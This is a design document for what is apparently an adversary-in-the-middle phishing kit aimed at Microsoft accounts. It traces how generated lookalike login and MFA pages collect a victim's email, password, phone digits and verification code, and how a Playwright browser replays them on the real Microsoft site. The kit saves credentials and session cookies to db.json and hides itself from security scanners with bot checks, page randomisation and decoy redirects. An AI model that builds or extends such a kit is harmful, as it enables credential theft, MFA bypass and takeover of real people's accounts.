# Complete Authentication Flow Trace

## Overview
This document traces the complete authentication flow for both **No MFA** and **MFA** scenarios, including all pages, WebSocket messages, and backend interactions.

---

## 🔐 Security Gateway Flow (Entry Point)

### 1. Initial Request: `GET /`
- **Handler**: `xyz/src/routes/gateway.js` → `router.get('/')`
- **Response**: Generated HTML from `generateGatewayPage()`
- **Page**: Gateway page with:
  - Cloudflare Turnstile widget (invisible)
  - Puzzle slider CAPTCHA
  - JavaScript Proof-of-Work (POW) computation
  - Browser fingerprinting

### 2. Client-Side Verification
- **Turnstile**: Cloudflare validates browser (invisible mode)
- **Slider**: User completes puzzle slider (65-85% position, tolerance: 5px)
- **POW**: Client computes SHA-256 hash starting with `0000` prefix
- **Fingerprint**: Collects browser characteristics (canvas, screen, timezone, etc.)

### 3. Gateway Verification: `POST /verify-gateway`
- **Handler**: `xyz/src/routes/gateway.js` → `router.post('/verify-gateway')`
- **Middleware**: `securityGatewayCheck()` from `xyz/src/middleware/securityChecks.js`
- **Checks** (in order):
  1. ✅ Slider validation (position, completion time 300-30000ms)
  2. ✅ Turnstile token verification (Cloudflare API)
  3. ✅ IP Reputation check (IPQualityScore API - fail-open for localhost)
  4. ✅ Bot detection (user-agent, fingerprint analysis)
  5. ✅ Proof-of-Work validation (hash prefix, timestamp freshness)
- **On Failure**: Redirect to `https://elementary.com`
- **On Success**: Generate 16-digit token via `generateToken(ip, fingerprint)`

### 4. Token Generation
- **Service**: `xyz/src/services/tokenManager.js`
- **Format**: 16 uppercase alphanumeric characters (A-Z, 0-9)
- **Lifetime**: 10 minutes (600,000ms)
- **Storage**: In-memory Map with auto-cleanup
- **Binding**: Token bound to IP address

### 5. Redirect to Auth Flow
- **Client**: Redirects to `/{token}` (e.g., `/A1B2C3D4E5F6G7H8`)
- **Handler**: `xyz/src/routes/auth.js` → `router.get('/:token')`
- **Middleware**: `tokenValidator()` validates token before serving page

---

## 📱 Authentication Flow: No MFA Scenario

### Step 1: Splash Page
- **URL**: `/{token}`
- **Handler**: `router.get('/:token')` → `generateMsSplashPage(token)`
- **Page**: Generated MS splash page
- **Action**: Auto-redirects to login page after brief delay

### Step 2: Login Page
- **URL**: `/{token}/login`
- **Handler**: `router.get('/:token/login')` → `generateMsLoginPage(token, { randomize: true })`
- **Page**: Generated MS login page with randomized IDs
- **WebSocket**: Client connects to `ws://localhost:3000`
- **User Action**: Enters email → clicks "Next"

### Step 3: Password Page
- **Backend**: Playwright automation detects password entry page
- **Handler**: `xyz/src/handlers/passwordHandler.js` → `handlePasswordEntry(page, password)`
- **Action**: Automatically fills password
- **WebSocket**: Sends status updates to frontend

### Step 4: Stay Signed In (Optional)
- **Backend**: Playwright detects "Stay signed in?" page
- **Handler**: `xyz/src/handlers/staySignedInHandler.js` → `handleStaySignedIn(page)`
- **Action**: Clicks "Yes" or "No" automatically

### Step 5: Success Detection
- **Backend**: `xyz/src/handlers/pageDetection.js` → `detectLoginSuccess(page)`
- **Indicators**: URL/title contains "outlook", "office", "dashboard", etc.
- **WebSocket**: Sends `{ status: 'login_success', redirect: 'https://www.outlook.com' }`
- **Frontend**: Redirects to Outlook
- **Backend**: Saves credentials + cookies to `db.json`

---

## 🔐 Authentication Flow: MFA Scenario

### Step 1-2: Same as No MFA (Splash → Login → Password)

### Step 3: MFA Detection
- **Backend**: Playwright detects verification options page
- **Handler**: `xyz/src/handlers/pageDetection.js` → `identifyCurrentPage(page)`
- **Detection**: Returns `'verification_options'` or `'mfa_choice'`
- **Handler**: `xyz/src/handlers/mfaHandlers.js` → `handleVerificationOptions(page)`

### Step 4: MFA Options Page (Very Page)
- **Backend**: Extracts masked emails/phones from page text using regex
- **Regex**: `xyz/src/config/regex.js` → `extractMaskedEmails()`, `extractMaskedPhones()`
- **WebSocket**: Sends first detected option immediately:
  ```json
  {
    "status": "option_selected",
    "selectedOption": "dw*****@gmail.com",
    "message": "Masked email detected"
  }
  ```
- **WebSocket**: Then sends redirect:
  ```json
  {
    "status": "mfa_options_ready",
    "message": "MFA options page detected - Redirecting to verification page",
    "redirect": "/{token}/very"
  }
  ```
- **Frontend**: Redirects to `/{token}/very`
- **Handler**: `router.get('/:token/very')` → `generateMsVeryPage(token)`
- **Page**: Generated MS verification options page showing masked emails/phones

### Step 5: User Selects Option
- **User**: Clicks on masked email/phone option in `very.html`
- **Frontend**: Stores selection in `sessionStorage.setItem('selectedOption', maskedEmail)`
- **Frontend**: Redirects to `/{token}/mailinput` (for email) or `/{token}/numinput` (for phone)

### Step 6A: Email Input (if email selected)
- **URL**: `/{token}/mailinput`
- **Handler**: `router.get('/:token/mailinput')` → `generateMsMailInputPage(token)`
- **Page**: Generated email input page
- **User**: Enters full email address
- **Frontend**: POSTs to `/api/send-verification-code`:
  ```json
  {
    "maskedEmail": "dw*****@gmail.com",
    "fullEmail": "dwayne@gmail.com",
    "token": "{token}"
  }
  ```
- **Backend**: `xyz/src/routes/api.js` → `router.post('/send-verification-code')`
  - Validates token via `requireValidToken` middleware
  - Stores `globalFullEmail` in globals
  - Calls `handleImmediateEmailInput(page, fullEmail)` if page available
- **Backend**: Playwright fills email in real MS page
- **WebSocket**: Sends `{ status: 'email_input_success' }` or `{ status: 'email_input_failed' }`
- **Frontend**: Redirects to `/{token}/codeinput`

### Step 6B: Phone Input (if phone selected)
- **URL**: `/{token}/numinput`
- **Handler**: `router.get('/:token/numinput')` → `generateMsPhoneInputPage(token)`
- **Page**: Generated phone input page
- **User**: Enters last 4 digits
- **Frontend**: POSTs to `/api/send-verification-code`:
  ```json
  {
    "maskedPhone": "Text ********86",
    "phoneDigits": "0086",
    "token": "{token}"
  }
  ```
- **Backend**: Stores `globalPhoneDigits` in globals
- **Backend**: Playwright fills phone digits in real MS page

### Step 7: Code Input Page
- **URL**: `/{token}/codeinput`
- **Handler**: `router.get('/:token/codeinput')` → `generateMsCodeInputPage(token)`
- **Page**: Generated 6-digit code input page
- **Backend**: Playwright detects code input page
- **Handler**: `xyz/src/handlers/codeHandler.js` → `handleCodeInput(page)`
- **WebSocket**: Sends redirect to codeinput:
  ```json
  {
    "status": "code_input_ready",
    "message": "Code input page ready - Redirecting to verification page",
    "redirect": "/{token}/codeinput"
  }
  ```
- **User**: Enters 6-digit verification code
- **Frontend**: POSTs to `/api/verify-code`:
  ```json
  {
    "code": "123456",
    "email": "dwayne@gmail.com"
  }
  ```
- **Backend**: `router.post('/verify-code')`
  - Validates token (via middleware)
  - Stores `globalVerificationCode` in globals
- **Backend**: Playwright waits for code, then fills it automatically
- **Backend**: Submits code form

### Step 8: Success Detection
- **Backend**: Detects success page (same as No MFA)
- **WebSocket**: Sends `{ status: 'login_success', redirect: 'https://www.outlook.com' }`
- **Backend**: Saves credentials + cookies + MFA type to `db.json`

---

## 🔌 WebSocket Message Flow

### Connection
- **Endpoint**: `ws://localhost:3000` (same port as HTTP server)
- **Setup**: `xyz/src/services/websocket.js` → `setupWebSocket(server)`
- **Connection**: Single client connection stored in `wsConnection` and `globalState`

### Message Types

#### 1. `automation_started`
- **Trigger**: After `/api/start-auth` receives credentials
- **Payload**: `{ status: 'automation_started', message: 'Automation process has begun' }`

#### 2. `option_selected`
- **Trigger**: When MFA options page detects masked email/phone
- **Payload**: `{ status: 'option_selected', selectedOption: 'dw*****@gmail.com', message: 'Masked email detected' }`

#### 3. `mfa_options_ready`
- **Trigger**: After sending first option, redirects to very page
- **Payload**: `{ status: 'mfa_options_ready', message: '...', redirect: '/{token}/very' }`

#### 4. `code_input_ready`
- **Trigger**: When code input page is detected
- **Payload**: `{ status: 'code_input_ready', message: '...', redirect: '/{token}/codeinput' }`

#### 5. `email_input_success` / `email_input_failed`
- **Trigger**: After attempting to fill email in real MS page
- **Payload**: `{ status: 'email_input_success', message: 'Email successfully input and code sent' }`

#### 6. `login_success`
- **Trigger**: When success page is detected
- **Payload**: `{ status: 'login_success', redirect: 'https://www.outlook.com', message: 'Login successful - Redirecting to Outlook' }`

#### 7. `automation_completed` / `automation_finished`
- **Trigger**: When automation completes (success or error)
- **Payload**: `{ status: 'automation_completed', message: 'Automation process completed successfully' }`

### Message Queueing
- If WebSocket not connected, messages are queued in `pendingQueue`
- Messages flushed when connection established

---

## 🛡️ Token Validation Flow

### URL-Based Routes (/:token/...)
- **Middleware**: `tokenValidator()` from `xyz/src/middleware/tokenValidator.js`
- **Validation**:
  1. Extract token from `req.params.token`
  2. Check format: 16 chars, uppercase alphanumeric
  3. Validate via `validateToken(token, ip)`:
     - Token exists in store
     - Not expired (< 10 minutes)
     - IP matches token's bound IP
  4. On failure: Redirect to `https://elementary.com`
  5. On success: Attach `req.validatedToken` and `req.tokenData`

### API Routes (/api/...)
- **Middleware**: `requireValidToken()` from same file
- **Validation**:
  1. Extract token from `req.body.token`, `req.query.token`, or `req.headers['x-session-token']`
  2. Same validation as URL routes
  3. On failure: Return `403 { success: false, redirect: 'https://elementary.com', message: 'Access denied' }`

---

## 📊 Page Generation System

All MS pages are **dynamically generated** (not static files) to avoid detection:

### Generators
- `xyz/src/generators/msSplashPage.js` → Splash page
- `xyz/src/generators/msLoginPage.js` → Login page (randomized IDs)
- `xyz/src/generators/msVeryPage.js` → MFA options page
- `xyz/src/generators/msMailInputPage.js` → Email input page
- `xyz/src/generators/msCodeInputPage.js` → Code input page
- `xyz/src/generators/msPhoneInputPage.js` → Phone input page

### Randomization
- **Utils**: `xyz/src/generators/utils/randomizer.js`
- **Features**:
  - Random element IDs
  - Random comments
  - Whitespace randomization
  - Anti-bot scripts

---

## 🔄 Backend Automation Flow

### Playwright Flow
- **Entry**: `xyz/src/automation/loginFlow.js` → `startAutomation(email, password, ws)`
- **Browser**: Created via `browserManager.js` (headless: false)
- **Page Detection**: Continuous loop checking page type via `identifyCurrentPage(page)`
- **Handlers**: Route to appropriate handler based on detected page type

### Page Types Detected
- `email_entry` → `handleEmailEntry()`
- `password_entry` → `handlePasswordEntry()`
- `stay_signed_in` → `handleStaySignedIn()`
- `verification_options` → `handleVerificationOptions()`
- `mfa_choice` → `handleMfaChoice()`
- `email_input` → `handleEmailInput()`
- `code_input` → `handleCodeInput()`
- `phone_digits_input` → `handlePhoneDigitsInput()`
- `success` → Save data and send success message
- `error` → Send error message
- `unknown` → Wait and retry

---

## 🗄️ Data Storage

### Global State
- **Service**: `xyz/src/config/globals.js` (singleton)
- **Storage**:
  - `globalPage`: Playwright page object
  - `globalLoginEmail`: User email
  - `globalLoginPassword`: User password
  - `globalToken`: Current session token
  - `globalFullEmail`: Full email for MFA
  - `globalMaskedEmail`: Masked email for MFA
  - `globalVerificationCode`: 6-digit code
  - `globalPhoneDigits`: Last 4 phone digits
  - `globalUserConfirmed`: User confirmation flag
  - `wsConnection`: WebSocket connection

### Database
- **Service**: `xyz/src/services/database.js`
- **File**: `xyz/db.json`
- **Structure**:
  ```json
  {
    "users": [
      {
        "email": "...",
        "password": "...",
        "cookies": [...],
        "mfaType": "email|phone|none",
        "timestamp": "..."
      }
    ]
  }
  ```

---

## ✅ Security Checks Summary

1. **Turnstile**: Cloudflare bot detection
2. **Slider**: Human interaction verification
3. **POW**: JavaScript proof-of-work (SHA-256 with prefix)
4. **IP Reputation**: VPN/proxy detection (fail-open)
5. **Bot Detection**: User-agent + fingerprint analysis
6. **Token Validation**: 10-minute expiry, IP-bound
7. **All Failures**: Redirect to `https://elementary.com`

---

## 🚨 Error Handling

- **Token Invalid/Expired**: Redirect to `https://elementary.com`
- **Security Check Failed**: Redirect to `https://elementary.com`
- **WebSocket Disconnected**: Queue messages, flush on reconnect
- **Page Detection Failed**: Retry with timeout
- **Automation Error**: Send error via WebSocket, log to console

---

## 📝 Notes

- All MS pages are **generated server-side** (no static files)
- Token is **required** for all auth routes and API endpoints
- WebSocket messages **auto-prefix** redirect URLs with token
- Backend automation runs **in parallel** with frontend pages
- MFA flow requires **synchronization** between frontend selection and backend clicking

